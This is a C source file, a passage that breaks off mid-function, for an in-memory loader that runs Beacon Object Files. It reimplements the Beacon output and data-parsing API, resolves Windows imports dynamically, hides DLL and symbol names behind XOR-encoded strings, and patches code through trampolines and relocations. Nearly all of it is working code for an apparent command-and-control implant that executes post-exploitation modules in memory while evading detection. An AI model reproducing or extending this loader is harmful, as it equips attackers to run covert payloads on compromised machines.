#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stdarg.h>

#include "bof.h"
#include "dynapi.h"
#include "obf.h"
#include "obf_strings.h"

#define COFF_MACHINE_AMD64 0x8664
#define COFF_SYM_UNDEFINED 0
#define COFF_REL_AMD64_ADDR64 0x0001
#define COFF_REL_AMD64_ADDR32NB 0x0003
#define COFF_REL_AMD64_REL32 0x0004
#define COFF_REL_AMD64_REL32_1 0x0005
#define COFF_REL_AMD64_REL32_2 0x0006
#define COFF_REL_AMD64_REL32_3 0x0007
#define COFF_REL_AMD64_REL32_4 0x0008
#define COFF_REL_AMD64_REL32_5 0x0009
#define BOF_MAX_SECTIONS 96
#define BOF_MAX_IMPORTS 192
#define BOF_TRAMPOLINE_SIZE 16
#define BOF_PAGE_SIZE 0x1000U
#define BOF_MAX_ALLOC 0x0FFFFFFFU

#ifndef IMAGE_SCN_MEM_EXECUTE
#define IMAGE_SCN_MEM_EXECUTE 0x20000000UL
#endif
#ifndef IMAGE_SCN_MEM_READ
#define IMAGE_SCN_MEM_READ 0x40000000UL
#endif
#ifndef IMAGE_SCN_MEM_WRITE
#define IMAGE_SCN_MEM_WRITE 0x80000000UL
#endif

#pragma pack(push, 1)
typedef struct {
    uint16_t machine;
    uint16_t number_of_sections;
    uint32_t time_date_stamp;
    uint32_t pointer_to_symbol_table;
    uint32_t number_of_symbols;
    uint16_t size_of_optional_header;
    uint16_t characteristics;
} coff_file_header_t;

typedef struct {
    char name[8];
    uint32_t virtual_size;
    uint32_t virtual_address;
    uint32_t size_of_raw_data;
    uint32_t pointer_to_raw_data;
    uint32_t pointer_to_relocations;
    uint32_t pointer_to_linenumbers;
    uint16_t number_of_relocations;
    uint16_t number_of_linenumbers;
    uint32_t characteristics;
} coff_section_header_t;

typedef struct {
    union {
        char short_name[8];
        struct {
            uint32_t zeroes;
            uint32_t offset;
        } long_name;
    } name;
    uint32_t value;
    int16_t section_number;
    uint16_t type;
    uint8_t storage_class;
    uint8_t number_of_aux_symbols;
} coff_symbol_t;

typedef struct {
    uint32_t virtual_address;
    uint32_t symbol_table_index;
    uint16_t type;
} coff_relocation_t;
#pragma pack(pop)

typedef struct {
    uint8_t *base;
    uint8_t *allocation;
    uint32_t size;
} bof_section_t;

typedef struct {
    void *value;
} bof_import_slot_t;

typedef struct {
    char *original;
    char *buffer;
    int length;
    int size;
} bof_datap_t;

typedef struct {
    bof_result_t *result;
    bof_import_slot_t *imports;
    uint8_t *trampolines;
    uint32_t import_count;
    uint32_t trampoline_count;
    uint32_t output_cap;
} bof_context_t;

static bof_context_t *g_bof_ctx = NULL;

static void mem_copy_bof(void *dst, const void *src, uint32_t n) {
    uint8_t *d = (uint8_t *)dst;
    const uint8_t *s = (const uint8_t *)src;
    uint32_t i;
    for (i = 0; i < n; i++) d[i] = s[i];
}

static void mem_zero_bof(void *dst, uint32_t n) {
    uint8_t *d = (uint8_t *)dst;
    uint32_t i;
    for (i = 0; i < n; i++) d[i] = 0;
}

static void *bof_memset(void *dst, int c, size_t n) {
    uint8_t *d = (uint8_t *)dst;
    size_t i;
    for (i = 0; i < n; i++) d[i] = (uint8_t)c;
    return dst;
}

static uint32_t str_len_bof(const char *s) {
    uint32_t n = 0;
    if (!s) return 0;
    while (s[n]) n++;
    return n;
}

static size_t bof_strlen(const char *s) {
    return (size_t)str_len_bof(s);
}

static int str_eq_bof(const char *a, const char *b) {
    uint32_t i = 0;
    if (!a || !b) return 0;
    while (a[i] && b[i]) {
        if (a[i] != b[i]) return 0;
        i++;
    }
    return a[i] == b[i];
}

static int str_has_prefix_bof(const char *s, const char *prefix) {
    uint32_t i = 0;
    if (!s || !prefix) return 0;
    while (prefix[i]) {
        if (s[i] != prefix[i]) return 0;
        i++;
    }
    return 1;
}

static char lower_ascii_bof(char c) {
    if (c >= 'A' && c <= 'Z') return (char)(c + 32);
    return c;
}

static int str_case_eq_n_bof(const char *a, const char *b, uint32_t n) {
    uint32_t i;
    if (!a || !b) return 0;
    for (i = 0; i < n; i++) {
        if (lower_ascii_bof(a[i]) != lower_ascii_bof(b[i])) return 0;
    }
    return 1;
}

static int str_case_eq_bof(const char *a, const char *b) {
    uint32_t i = 0;
    if (!a || !b) return 0;
    while (a[i] && b[i]) {
        if (lower_ascii_bof(a[i]) != lower_ascii_bof(b[i])) return 0;
        i++;
    }
    return a[i] == b[i];
}

static char *find_char_bof(char *s, char c) {
    if (!s) return NULL;
    while (*s) {
        if (*s == c) return s;
        s++;
    }
    return NULL;
}

static int append_output_bof(const char *data, uint32_t len) {
    bof_result_t *r;
    char *next;
    uint32_t need;
    uint32_t cap;
    if (!g_bof_ctx || !g_bof_ctx->result || !data) return -1;
    if (len == 0) return 0;
    if (!fnLocalAlloc) return -1;

    r = g_bof_ctx->result;
    if (r->output_len > 0x7FFFFFF0U || len > 0x7FFFFFF0U - r->output_len) return -1;
    need = r->output_len + len + 1U;
    if (need > g_bof_ctx->output_cap) {
        cap = g_bof_ctx->output_cap ? g_bof_ctx->output_cap : 512U;
        while (cap < need) {
            if (cap > 0x40000000U) return -1;
            cap *= 2U;
        }
        next = (char *)fnLocalAlloc(LPTR, (SIZE_T)cap);
        if (!next) return -1;
        if (r->output && r->output_len) {
            mem_copy_bof(next, r->output, r->output_len);
        }
        if (r->output && fnLocalFree) fnLocalFree(r->output);
        r->output = next;
        g_bof_ctx->output_cap = cap;
    }
    mem_copy_bof(r->output + r->output_len, data, len);
    r->output_len += len;
    r->output[r->output_len] = 0;
    return 0;
}

static int symbol_eq_obf_bof(const char *name, const unsigned char *enc, int len) {
    char decoded[96];
    if (!name || len <= 0 || len >= (int)sizeof(decoded)) return 0;
    xor_dec(decoded, enc, len);
    decoded[len] = 0;
    return str_eq_bof(name, decoded);
}

static int symbol_case_eq_obf_bof(const char *name, const unsigned char *enc, int len) {
    char decoded[96];
    if (!name || len <= 0 || len >= (int)sizeof(decoded)) return 0;
    xor_dec(decoded, enc, len);
    decoded[len] = 0;
    return str_case_eq_bof(name, decoded);
}

static int symbol_has_prefix_obf_bof(const char *name, const unsigned char *enc, int len) {
    char decoded[96];
    if (!name || len <= 0 || len >= (int)sizeof(decoded)) return 0;
    xor_dec(decoded, enc, len);
    decoded[len] = 0;
    return str_has_prefix_bof(name, decoded);
}

static void append_obf_bof(const unsigned char *enc, int len) {
    char decoded[128];
    if (!enc || len <= 0) return;
    if (len >= (int)sizeof(decoded)) len = (int)sizeof(decoded) - 1;
    xor_dec(decoded, enc, len);
    decoded[len] = 0;
    append_output_bof(decoded, (uint32_t)len);
}

static void append_char_bof(char c) {
    append_output_bof(&c, 1);
}

static void append_cstr_bof(const char *s) {
    if (!s) return;
    append_output_bof(s, str_len_bof(s));
}

static void append_unresolved_symbol_bof(const char *name) {
    append_obf_bof(ENC_BOF_ERR_SYMBOL_DETAIL, ENC_BOF_ERR_SYMBOL_DETAIL_LEN);
    append_cstr_bof(name ? name : "?");
}

static void append_wstr_bof(const WCHAR *s) {
    char tmp[512];
    int n;
    uint32_t i;
    if (!s) return;
    if (fnWideCharToMultiByte) {
        n = fnWideCharToMultiByte(CP_UTF8, 0, s, -1, tmp, sizeof(tmp), NULL, NULL);
        if (n > 0) {
            append_output_bof(tmp, (uint32_t)(n - 1));
            return;
        }
    }
    for (i = 0; s[i]; i++) {
        char c = (s[i] <= 0x7f) ? (char)s[i] : '?';
        append_char_bof(c);
    }
}

static void append_uint_bof(uint64_t v, uint32_t base, int uppercase) {
    char tmp[32];
    char digits_l[] = {'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'};
    char digits_u[] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
    char *digits = uppercase ? digits_u : digits_l;
    uint32_t pos = 0;

    if (base < 2 || base > 16) return;
    if (v == 0) {
        append_char_bof('0');
        return;
    }
    while (v && pos < sizeof(tmp)) {
        tmp[pos++] = digits[v % base];
        v /= base;
    }
    while (pos > 0) append_char_bof(tmp[--pos]);
}

static void append_int_bof(int64_t v) {
    uint64_t u;
    if (v < 0) {
        append_char_bof('-');
        u = (uint64_t)(-v);
    } else {
        u = (uint64_t)v;
    }
    append_uint_bof(u, 10, 0);
}

static void append_pointer_bof(void *p) {
    append_char_bof('0');
    append_char_bof('x');
    append_uint_bof((uint64_t)(uintptr_t)p, 16, 0);
}

static void format_append_bof(char *fmt, va_list ap) {
    char *p = fmt;
    while (p && *p) {
        int long_flag = 0;
        int long_long_flag = 0;

        if (*p != '%') {
            append_char_bof(*p++);
            continue;
        }
        p++;
        if (*p == '%') {
            append_char_bof('%');
            p++;
            continue;
        }
        while (*p >= '0' && *p <= '9') p++;
        if (*p == 'l') {
            long_flag = 1;
            p++;
            if (*p == 'l') {
                long_long_flag = 1;
                p++;
            }
        } else if (*p == 'z') {
            long_long_flag = 1;
            p++;
        }

        switch (*p) {
        case 's':
            if (long_flag) append_wstr_bof(va_arg(ap, WCHAR *));
            else append_cstr_bof(va_arg(ap, char *));
            break;
        case 'S':
            append_wstr_bof(va_arg(ap, WCHAR *));
            break;
        case 'd':
        case 'i':
            if (long_long_flag) append_int_bof(va_arg(ap, int64_t));
            else if (long_flag) append_int_bof((int64_t)va_arg(ap, long));
            else append_int_bof((int64_t)va_arg(ap, int));
            break;
        case 'u':
            if (long_long_flag) append_uint_bof(va_arg(ap, uint64_t), 10, 0);
            else if (long_flag) append_uint_bof((uint64_t)va_arg(ap, unsigned long), 10, 0);
            else append_uint_bof((uint64_t)va_arg(ap, unsigned int), 10, 0);
            break;
        case 'x':
            if (long_long_flag) append_uint_bof(va_arg(ap, uint64_t), 16, 0);
            else if (long_flag) append_uint_bof((uint64_t)va_arg(ap, unsigned long), 16, 0);
            else append_uint_bof((uint64_t)va_arg(ap, unsigned int), 16, 0);
            break;
        case 'X':
            if (long_long_flag) append_uint_bof(va_arg(ap, uint64_t), 16, 1);
            else if (long_flag) append_uint_bof((uint64_t)va_arg(ap, unsigned long), 16, 1);
            else append_uint_bof((uint64_t)va_arg(ap, unsigned int), 16, 1);
            break;
        case 'p':
            append_pointer_bof(va_arg(ap, void *));
            break;
        case 'c':
            append_char_bof((char)va_arg(ap, int));
            break;
        default:
            if (*p) append_char_bof(*p);
            break;
        }
        if (*p) p++;
    }
}

void BeaconOutput(int type, char *data, int len) {
    (void)type;
    if (!data || len <= 0) return;
    append_output_bof(data, (uint32_t)len);
}

void BeaconPrintf(int type, char *fmt, ...) {
    char eol[2] = {13, 10};
    va_list ap;
    (void)type;
    if (!fmt) return;
    va_start(ap, fmt);
    format_append_bof(fmt, ap);
    va_end(ap);
    append_output_bof(eol, 2);
}

static void format_buffer_append_bof(bof_datap_t *format, const char *data, uint32_t len) {
    uint32_t room;
    uint32_t n;
    if (!format || !format->original || !data || len == 0 || format->size <= 0) return;
    if (format->length < 0 || format->length >= format->size) return;
    room = (uint32_t)(format->size - format->length - 1);
    if (room == 0) return;
    n = len < room ? len : room;
    mem_copy_bof(format->original + format->length, data, n);
    format->length += (int)n;
    format->original[format->length] = 0;
    format->buffer = format->original + format->length;
}

static void format_buffer_char_bof(bof_datap_t *format, char c) {
    format_buffer_append_bof(format, &c, 1);
}

static void format_buffer_cstr_bof(bof_datap_t *format, const char *s) {
    if (!s) return;
    format_buffer_append_bof(format, s, str_len_bof(s));
}

static void format_buffer_wstr_bof(bof_datap_t *format, const WCHAR *s) {
    char tmp[512];
    int n;
    uint32_t i;
    if (!s) return;
    if (fnWideCharToMultiByte) {
        n = fnWideCharToMultiByte(CP_UTF8, 0, s, -1, tmp, sizeof(tmp), NULL, NULL);
        if (n > 0) {
            format_buffer_append_bof(format, tmp, (uint32_t)(n - 1));
            return;
        }
    }
    for (i = 0; s[i]; i++) {
        char c = (s[i] <= 0x7f) ? (char)s[i] : '?';
        format_buffer_char_bof(format, c);
    }
}

static void format_buffer_uint_bof(bof_datap_t *format, uint64_t v, uint32_t base, int uppercase) {
    char tmp[32];
    char digits_l[] = {'0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f'};
    char digits_u[] = {'0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F'};
    char *digits = uppercase ? digits_u : digits_l;
    uint32_t pos = 0;

    if (base < 2 || base > 16) return;
    if (v == 0) {
        format_buffer_char_bof(format, '0');
        return;
    }
    while (v && pos < sizeof(tmp)) {
        tmp[pos++] = digits[v % base];
        v /= base;
    }
    while (pos > 0) format_buffer_char_bof(format, tmp[--pos]);
}

static void format_buffer_int_bof(bof_datap_t *format, int64_t v) {
    uint64_t u;
    if (v < 0) {
        format_buffer_char_bof(format, '-');
        u = (uint64_t)(-v);
    } else {
        u = (uint64_t)v;
    }
    format_buffer_uint_bof(format, u, 10, 0);
}

static void format_buffer_pointer_bof(bof_datap_t *format, void *p) {
    format_buffer_char_bof(format, '0');
    format_buffer_char_bof(format, 'x');
    format_buffer_uint_bof(format, (uint64_t)(uintptr_t)p, 16, 0);
}

static void format_buffer_vprintf_bof(bof_datap_t *format, char *fmt, va_list ap) {
    char *p = fmt;
    while (p && *p) {
        int long_flag = 0;
        int long_long_flag = 0;

        if (*p != '%') {
            format_buffer_char_bof(format, *p++);
            continue;
        }
        p++;
        if (*p == '%') {
            format_buffer_char_bof(format, '%');
            p++;
            continue;
        }
        while (*p >= '0' && *p <= '9') p++;
        if (*p == 'l') {
            long_flag = 1;
            p++;
            if (*p == 'l') {
                long_long_flag = 1;
                p++;
            }
        } else if (*p == 'z') {
            long_long_flag = 1;
            p++;
        }

        switch (*p) {
        case 's':
            if (long_flag) format_buffer_wstr_bof(format, va_arg(ap, WCHAR *));
            else format_buffer_cstr_bof(format, va_arg(ap, char *));
            break;
        case 'S':
            format_buffer_wstr_bof(format, va_arg(ap, WCHAR *));
            break;
        case 'd':
        case 'i':
            if (long_long_flag) format_buffer_int_bof(format, va_arg(ap, int64_t));
            else if (long_flag) format_buffer_int_bof(format, (int64_t)va_arg(ap, long));
            else format_buffer_int_bof(format, (int64_t)va_arg(ap, int));
            break;
        case 'u':
            if (long_long_flag) format_buffer_uint_bof(format, va_arg(ap, uint64_t), 10, 0);
            else if (long_flag) format_buffer_uint_bof(format, (uint64_t)va_arg(ap, unsigned long), 10, 0);
            else format_buffer_uint_bof(format, (uint64_t)va_arg(ap, unsigned int), 10, 0);
            break;
        case 'x':
            if (long_long_flag) format_buffer_uint_bof(format, va_arg(ap, uint64_t), 16, 0);
            else if (long_flag) format_buffer_uint_bof(format, (uint64_t)va_arg(ap, unsigned long), 16, 0);
            else format_buffer_uint_bof(format, (uint64_t)va_arg(ap, unsigned int), 16, 0);
            break;
        case 'X':
            if (long_long_flag) format_buffer_uint_bof(format, va_arg(ap, uint64_t), 16, 1);
            else if (long_flag) format_buffer_uint_bof(format, (uint64_t)va_arg(ap, unsigned long), 16, 1);
            else format_buffer_uint_bof(format, (uint64_t)va_arg(ap, unsigned int), 16, 1);
            break;
        case 'p':
            format_buffer_pointer_bof(format, va_arg(ap, void *));
            break;
        case 'c':
            format_buffer_char_bof(format, (char)va_arg(ap, int));
            break;
        default:
            if (*p) format_buffer_char_bof(format, *p);
            break;
        }
        if (*p) p++;
    }
}

void BeaconFormatAlloc(bof_datap_t *format, int maxsz) {
    if (!format) return;
    mem_zero_bof(format, sizeof(*format));
    if (maxsz <= 0 || !fnLocalAlloc) return;
    format->original = (char *)fnLocalAlloc(LPTR, (SIZE_T)maxsz);
    if (!format->original) return;
    format->buffer = format->original;
    format->length = 0;
    format->size = maxsz;
}

void BeaconFormatReset(bof_datap_t *format) {
    if (!format || !format->original) return;
    format->buffer = format->original;
    format->length = 0;
    if (format->size > 0) format->original[0] = 0;
}

void BeaconFormatFree(bof_datap_t *format) {
    if (!format) return;
    if (format->original && fnLocalFree) fnLocalFree(format->original);
    mem_zero_bof(format, sizeof(*format));
}

void BeaconFormatAppend(bof_datap_t *format, char *text, int len) {
    if (!text) return;
    if (len < 0) len = (int)str_len_bof(text);
    format_buffer_append_bof(format, text, (uint32_t)len);
}

void BeaconFormatPrintf(bof_datap_t *format, char *fmt, ...) {
    va_list ap;
    if (!format || !fmt) return;
    va_start(ap, fmt);
    format_buffer_vprintf_bof(format, fmt, ap);
    va_end(ap);
}

char *BeaconFormatToString(bof_datap_t *format, int *size) {
    if (size) *size = 0;
    if (!format || !format->original) return NULL;
    if (size) *size = format->length;
    return format->original;
}

void BeaconFormatInt(bof_datap_t *format, int value) {
    format_buffer_int_bof(format, (int64_t)value);
}

BOOL toWideChar(char *src, WCHAR *dst, int max) {
    int n;
    int i;
    if (!src || !dst || max <= 0) return FALSE;
    if (fnMultiByteToWideChar) {
        n = fnMultiByteToWideChar(CP_ACP, 0, src, -1, dst, max);
        if (n > 0) return TRUE;
    }
    for (i = 0; i < max - 1 && src[i]; i++) {
        dst[i] = (WCHAR)(unsigned char)src[i];
    }
    dst[i] = 0;
    return TRUE;
}

void BeaconDataParse(bof_datap_t *parser, char *buffer, int size) {
    if (!parser) return;
    parser->original = buffer;
    parser->buffer = buffer;
    parser->length = size;
    parser->size = size;
}

char *BeaconDataExtract(bof_datap_t *parser, int *size) {
    uint32_t len;
    char *out;
    if (size) *size = 0;
    if (!parser || parser->length < 4 || !parser->buffer) return NULL;
    len = (uint8_t)parser->buffer[0]
        | ((uint32_t)(uint8_t)parser->buffer[1] << 8)
        | ((uint32_t)(uint8_t)parser->buffer[2] << 16)
        | ((uint32_t)(uint8_t)parser->buffer[3] << 24);
    if (len > (uint32_t)(parser->length - 4)) return NULL;
    out = parser->buffer + 4;
    parser->buffer += 4 + len;
    parser->length -= 4 + (int)len;
    if (size) *size = (int)len;
    return out;
}

int BeaconDataInt(bof_datap_t *parser) {
    char *p;
    int out;
    if (!parser || parser->length < 4 || !parser->buffer) return 0;
    p = parser->buffer;
    out = (int)((uint8_t)p[0]
        | ((uint32_t)(uint8_t)p[1] << 8)
        | ((uint32_t)(uint8_t)p[2] << 16)
        | ((uint32_t)(uint8_t)p[3] << 24));
    parser->buffer += 4;
    parser->length -= 4;
    return out;
}

short BeaconDataShort(bof_datap_t *parser) {
    char *p;
    short out;
    if (!parser || parser->length < 2 || !parser->buffer) return 0;
    p = parser->buffer;
    out = (short)((uint8_t)p[0] | ((uint16_t)(uint8_t)p[1] << 8));
    parser->buffer += 2;
    parser->length -= 2;
    return out;
}

int BeaconDataLength(bof_datap_t *parser) {
    if (!parser || parser->length < 0) return 0;
    return parser->length;
}

char *BeaconDataPtr(bof_datap_t *parser, int size) {
    char *out;
    if (!parser || !parser->buffer || size < 0 || parser->length < size) return NULL;
    out = parser->buffer;
    parser->buffer += size;
    parser->length -= size;
    return out;
}

static void bof_set_last_error(DWORD err) {
    (void)err;
}

static LPWSTR bof_lstrcat_w(LPWSTR dst, LPCWSTR src) {
    LPWSTR out = dst;
    if (!dst || !src) return dst;
    while (*dst) dst++;
    while (*src) *dst++ = *src++;
    *dst = 0;
    return out;
}

static void *builtin_symbol_bof(const char *name) {
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_PRINTF, ENC_BOF_BEACON_PRINTF_LEN)) return (void *)BeaconPrintf;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_OUTPUT, ENC_BOF_BEACON_OUTPUT_LEN)) return (void *)BeaconOutput;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_DATA_PARSE, ENC_BOF_BEACON_DATA_PARSE_LEN)) return (void *)BeaconDataParse;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_DATA_EXTRACT, ENC_BOF_BEACON_DATA_EXTRACT_LEN)) return (void *)BeaconDataExtract;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_DATA_INT, ENC_BOF_BEACON_DATA_INT_LEN)) return (void *)BeaconDataInt;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_DATA_SHORT, ENC_BOF_BEACON_DATA_SHORT_LEN)) return (void *)BeaconDataShort;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_DATA_LENGTH, ENC_BOF_BEACON_DATA_LENGTH_LEN)) return (void *)BeaconDataLength;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_DATA_PTR, ENC_BOF_BEACON_DATA_PTR_LEN)) return (void *)BeaconDataPtr;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_FORMAT_ALLOC, ENC_BOF_BEACON_FORMAT_ALLOC_LEN)) return (void *)BeaconFormatAlloc;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_FORMAT_RESET, ENC_BOF_BEACON_FORMAT_RESET_LEN)) return (void *)BeaconFormatReset;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_FORMAT_FREE, ENC_BOF_BEACON_FORMAT_FREE_LEN)) return (void *)BeaconFormatFree;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_FORMAT_APPEND, ENC_BOF_BEACON_FORMAT_APPEND_LEN)) return (void *)BeaconFormatAppend;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_FORMAT_PRINTF, ENC_BOF_BEACON_FORMAT_PRINTF_LEN)) return (void *)BeaconFormatPrintf;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_FORMAT_TO_STRING, ENC_BOF_BEACON_FORMAT_TO_STRING_LEN)) return (void *)BeaconFormatToString;
    if (symbol_eq_obf_bof(name, ENC_BOF_BEACON_FORMAT_INT, ENC_BOF_BEACON_FORMAT_INT_LEN)) return (void *)BeaconFormatInt;
    if (symbol_eq_obf_bof(name, ENC_BOF_TO_WIDE_CHAR, ENC_BOF_TO_WIDE_CHAR_LEN)) return (void *)toWideChar;
    return NULL;
}

static void *compat_symbol_bof(const char *dll_name, const char *fn_name) {
    if (symbol_case_eq_obf_bof(dll_name, ENC_DLL_MSVCRT, ENC_DLL_MSVCRT_LEN)) {
        if (symbol_eq_obf_bof(fn_name, ENC_BOF_MEMSET, ENC_BOF_MEMSET_LEN)) return (void *)bof_memset;
        if (symbol_eq_obf_bof(fn_name, ENC_BOF_STRLEN, ENC_BOF_STRLEN_LEN)) return (void *)bof_strlen;
    }
    return NULL;
}

static void *fallback_symbol_bof(const char *dll_name, const char *fn_name) {
    if (symbol_case_eq_obf_bof(dll_name, ENC_DLL_KERNEL32_A, ENC_DLL_KERNEL32_A_LEN)) {
        if (symbol_eq_obf_bof(fn_name, ENC_BOF_SET_LAST_ERROR, ENC_BOF_SET_LAST_ERROR_LEN)) return (void *)bof_set_last_error;
        if (symbol_eq_obf_bof(fn_name, ENC_BOF_LSTRCAT_W, ENC_BOF_LSTRCAT_W_LEN)) return (void *)bof_lstrcat_w;
    }
    return NULL;
}

static HMODULE known_module_bof(const char *dll_name) {
    char known[ENC_DLL_ADVAPI32_LEN + 1];
    HMODULE mod;

    if (symbol_case_eq_obf_bof(dll_name, ENC_DLL_KERNEL32_A, ENC_DLL_KERNEL32_A_LEN)) {
        xor_dec(known, ENC_DLL_KERNEL32_A, ENC_DLL_KERNEL32_A_LEN);
        mod = fnGetModuleHandleA ? fnGetModuleHandleA(known) : NULL;
        if (!mod && fnLoadLibraryA) mod = fnLoadLibraryA(known);
        return mod;
    }
    if (symbol_case_eq_obf_bof(dll_name, ENC_DLL_ADVAPI32, ENC_DLL_ADVAPI32_LEN)) {
        xor_dec(known, ENC_DLL_ADVAPI32, ENC_DLL_ADVAPI32_LEN);
        mod = fnGetModuleHandleA ? fnGetModuleHandleA(known) : NULL;
        if (!mod && fnLoadLibraryA) mod = fnLoadLibraryA(known);
        return mod;
    }
    if (symbol_case_eq_obf_bof(dll_name, ENC_DLL_MSVCRT, ENC_DLL_MSVCRT_LEN)) {
        char msvcrt[ENC_DLL_MSVCRT_LEN + 1];
        xor_dec(msvcrt, ENC_DLL_MSVCRT, ENC_DLL_MSVCRT_LEN);
        mod = fnGetModuleHandleA ? fnGetModuleHandleA(msvcrt) : NULL;
        if (!mod && fnLoadLibraryA) mod = fnLoadLibraryA(msvcrt);
        return mod;
    }
    return NULL;
}

static void *bare_kernel32_symbol_bof(const char *name) {
    char dll_name[ENC_DLL_KERNEL32_A_LEN + 1];
    char fn_name[ENC_BOF_FREE_LIBRARY_LEN + 1];
    HMODULE mod;

    if (symbol_eq_obf_bof(name, ENC_BOF_LOAD_LIBRARY_A, ENC_BOF_LOAD_LIBRARY_A_LEN)) return (void *)fnLoadLibraryA;
    if (symbol_eq_obf_bof(name, ENC_BOF_GET_PROC_ADDRESS, ENC_BOF_GET_PROC_ADDRESS_LEN)) return (void *)fnGetProcAddress;
    if (!symbol_eq_obf_bof(name, ENC_BOF_FREE_LIBRARY, ENC_BOF_FREE_LIBRARY_LEN)) return NULL;
    if (!fnGetProcAddress) return NULL;

    xor_dec(dll_name, ENC_DLL_KERNEL32_A, ENC_DLL_KERNEL32_A_LEN);
    mod = fnGetModuleHandleA ? fnGetModuleHandleA(dll_name) : NULL;
    if (!mod && fnLoadLibraryA) mod = fnLoadLibraryA(dll_name);
    if (!mod) return NULL;

    xor_dec(fn_name, ENC_BOF_FREE_LIBRARY, ENC_BOF_FREE_LIBRARY_LEN);
    return (void *)fnGetProcAddress(mod, fn_name);
}

static void *external_symbol_bof(const char *name) {
    char dll_name[80];
    char fn_name[128];
    char dll_ext[ENC_DLL_EXT_LEN + 1];
    char *sep;
    uint32_t dll_len;
    uint32_t fn_len;
    HMODULE mod;
    void *target;

    sep = find_char_bof((char *)name, '$');
    if (!sep || sep == name || !sep[1]) {
        void *target = builtin_symbol_bof(name);
        if (target) return target;
        return bare_kernel32_symbol_bof(name);
    }

    dll_len = (uint32_t)(sep - name);
    fn_len = str_len_bof(sep + 1);
    if (dll_len + ENC_DLL_EXT_LEN + 1 >= sizeof(dll_name) || fn_len >= sizeof(fn_name)) return NULL;

    xor_dec(dll_ext, ENC_DLL_EXT, ENC_DLL_EXT_LEN);
    dll_ext[ENC_DLL_EXT_LEN] = 0;

    mem_copy_bof(dll_name, name, dll_len);
    if (dll_len < ENC_DLL_EXT_LEN || !str_case_eq_n_bof(dll_name + dll_len - ENC_DLL_EXT_LEN, dll_ext, ENC_DLL_EXT_LEN)) {
        mem_copy_bof(dll_name + dll_len, dll_ext, ENC_DLL_EXT_LEN + 1);
    } else {
        dll_name[dll_len] = 0;
    }
    mem_copy_bof(fn_name, sep + 1, fn_len);
    fn_name[fn_len] = 0;

    target = compat_symbol_bof(dll_name, fn_name);
    if (target) return target;

    mod = fnGetModuleHandleA ? fnGetModuleHandleA(dll_name) : NULL;
    if (!mod && fnLoadLibraryA) mod = fnLoadLibraryA(dll_name);
    if (mod && fnGetProcAddress) {
        target = (void *)fnGetProcAddress(mod, fn_name);
        if (target) return target;
    }

    mod = known_module_bof(dll_name);
    if (mod && fnGetProcAddress) {
        target = (void *)fnGetProcAddress(mod, fn_name);
        if (target) return target;
    }

    target = fallback_symbol_bof(dll_name, fn_name);
    if (target) return target;

    return NULL;
}

static void *import_slot_bof(void *target) {
    bof_import_slot_t *slot;
    if (!g_bof_ctx || !target || g_bof_ctx->import_count >= BOF_MAX_IMPORTS) return NULL;
    slot = &g_bof_ctx->imports[g_bof_ctx->import_count++];
    slot->value = target;
    return &slot->value;
}

static void *trampoline_bof(void *target) {
    uint8_t *slot;
    if (!g_bof_ctx || !target || g_bof_ctx->trampoline_count >= BOF_MAX_IMPORTS) return NULL;
    slot = g_bof_ctx->trampolines + (g_bof_ctx->trampoline_count++ * BOF_TRAMPOLINE_SIZE);
    slot[0] = 0x48;
    slot[1] = 0xB8;
    *(uint64_t *)(slot + 2) = (uint64_t)(uintptr_t)target;
    slot[10] = 0xFF;
    slot[11] = 0xE0;
    return slot;
}

static const char *symbol_name_bof(const coff_symbol_t *sym,
                                   const char *strtab,
                                   uint32_t strtab_len,
                                   char short_buf[9]) {
    uint32_t off;
    uint32_t i;
    if (!sym) return NULL;
    if (sym->name.long_name.zeroes == 0) {
        off = sym->name.long_name.offset;
        if (off >= strtab_len) return NULL;
        for (i = off; i < strtab_len; i++) {
            if (strtab[i] == 0) return strtab + off;
        }
        return NULL;
    }
    mem_copy_bof(short_buf, sym->name.short_name, 8);
    short_buf[8] = 0;
    return short_buf;
}

static void *resolve_symbol_bof(const coff_symbol_t *symbols,
                                uint32_t symbol_count,
                                const char *strtab,
                                uint32_t strtab_len,
                                bof_section_t *sections,
                                uint16_t section_count,
                                uint32_t index) {
    const coff_symbol_t *sym;
    const char *name;
    char short_name[9];
    void *target;
    int is_imp = 0;

    if (index >= symbol_count) return NULL;
    sym = &symbols[index];

    if (sym->section_number > 0 && (uint16_t)sym->section_number <= section_count) {
        bof_section_t *sec = &sections[(uint16_t)sym->section_number - 1];
        if (!sec->base || sym->value >= sec->size) return NULL;
        return sec->base + sym->value;
    }

    if (sym->section_number != COFF_SYM_UNDEFINED) return NULL;
    name = symbol_name_bof(sym, strtab, strtab_len, short_name);
    if (!name) return NULL;

    if (symbol_has_prefix_obf_bof(name, ENC_BOF_IMPORT_PREFIX, ENC_BOF_IMPORT_PREFIX_LEN)) {
        is_imp = 1;
        name += ENC_BOF_IMPORT_PREFIX_LEN;
    }
    target = external_symbol_bof(name);
    if (!target) {
        append_unresolved_symbol_bof(name);
        return NULL;
    }
    target = is_imp ? import_slot_bof(target) : trampoline_bof(target);
    if (!target) append_unresolved_symbol_bof(name);
    return target;
}

static int apply_relocation_bof(uint8_t *patch,
                                uint16_t type,
                                uint64_t target,
                                uint64_t location) {
    int64_t rel;
    switch (type) {
    case COFF_REL_AMD64_ADDR64:
        *(uint64_t *)patch = target + *(uint64_t *)patch;
        return 0;
    case COFF_REL_AMD64_ADDR32NB:
        *(uint32_t *)patch = (uint32_t)(target + *(uint32_t *)patch);
        return 0;
    case COFF_REL_AMD64_REL32:
